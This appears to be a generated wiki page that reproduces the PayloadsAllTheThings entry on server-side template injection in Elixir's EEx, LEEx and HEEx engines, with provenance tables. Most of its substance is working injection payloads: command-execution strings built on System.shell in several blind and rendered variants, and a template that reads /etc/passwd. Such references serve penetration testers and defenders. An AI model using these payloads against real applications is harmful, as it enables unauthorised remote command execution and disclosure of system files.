---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Server Side Template Injection - Elixir

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-server-side-template-injection-elixir` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Server Side Template Injection/Elixir.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Server Side Template Injection - Elixir](../../topics/server-side-template-injection/server-side-template-injection-elixir.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-server-side-template-injection-elixir |
| name | Server Side Template Injection - Elixir |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Elixir.md |

## Preserved Source Material

````yaml
_body: "# Server Side Template Injection - Elixir\n\n> Server-Side Template Injection (SSTI)  is a vulnerability that arises\
  \ when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands.\
  \ In Elixir, SSTI can occur when using templating engines like EEx (Embedded Elixir), especially when user input is incorporated\
  \ into templates without proper sanitization or validation.\n\n## Summary\n\n- [Templating Libraries](#templating-libraries)\n\
  - [Universal Payloads](#universal-payloads)\n- [EEx](#eex)\n    - [EEx - Basic injections](#eex---basic-injections)\n  \
  \  - [EEx - Retrieve /etc/passwd](#eex---retrieve-etcpasswd)\n    - [EEx - Remote Command execution](#eex---remote-command-execution)\n\
  - [References](#references)\n\n## Templating Libraries\n\n| Template Name | Payload Format |\n|---------------|----------------|\n\
  | EEx           | `<%= %>`       |\n| LEEx          | `<%= %>`       |\n| HEEx          | `<%= %>`       |\n\n## Universal\
  \ Payloads\n\nGeneric code injection payloads work for many Elixir-based template engines, such as EEx, LEEx and HEEx.\n\
  \nBy default, only EEx can render templates from string, but it is possible to use LEEx and HEEx as replacement engines\
  \ for EEx.\n\nTo use these payloads, wrap them in the appropriate tag.\n\n```erlang\nelem(System.shell(\"id\"), 0) # Rendered\
  \ RCE\n[1, 2][elem(System.shell(\"id\"), 0)] # Error-Based RCE\n1/((elem(System.shell(\"id\"), 1) == 0)&&1||0) # Boolean-Based\
  \ RCE\nelem(System.shell(\"id && sleep 5\"), 0) # Time-Based RCE\n```\n\n## EEx\n\n[Official website](https://hexdocs.pm/eex/1.19.5/EEx.html)\n\
  > EEx stands for Embedded Elixir.\n\n### EEx - Basic injections\n\n```erlang\n<%= 7 * 7 %>\n```\n\n### EEx - Retrieve /etc/passwd\n\
  \n```erlang\n<%= File.read!(\"/etc/passwd\") %>\n```\n\n### EEx - Remote Command execution\n\n```erlang\n<%= elem(System.shell(\"\
  id\"), 0) %> # Rendered RCE\n<%= [1, 2][elem(System.shell(\"id\"), 0)] %> # Error-Based RCE\n<%= 1/((elem(System.shell(\"\
  id\"), 1) == 0)&&1||0) %> # Boolean-Based RCE\n<%= elem(System.shell(\"id && sleep 5\"), 0) %> # Time-Based RCE\n```\n\n\
  ## References\n\n- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)"
_relative_path: Server Side Template Injection/Elixir.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Server Side Template Injection/Elixir.md
````
